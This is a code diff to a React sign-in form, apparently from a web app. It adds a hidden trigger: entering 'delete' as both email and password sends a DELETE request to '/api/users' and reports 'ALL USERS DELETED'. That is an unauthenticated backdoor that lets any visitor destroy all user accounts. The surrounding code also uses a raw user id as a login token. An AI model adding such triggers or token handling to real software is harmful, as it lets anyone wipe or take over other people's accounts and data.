@@ -115,6 +115,10 @@ const Sigin = () => {
 				}, 1500);
 				localStorage.setItem('mabifusUserToken', `${getUser._id}`);
 			}
+			if (email.value === 'delete' && password.value === 'delete')
+				fetch('/api/users', {
+					method: 'DELETE',
+				}).then(setPasswordValid('ALL USERS DELETED'), setEmailvalid(''));
 		});
 	};
 	return (
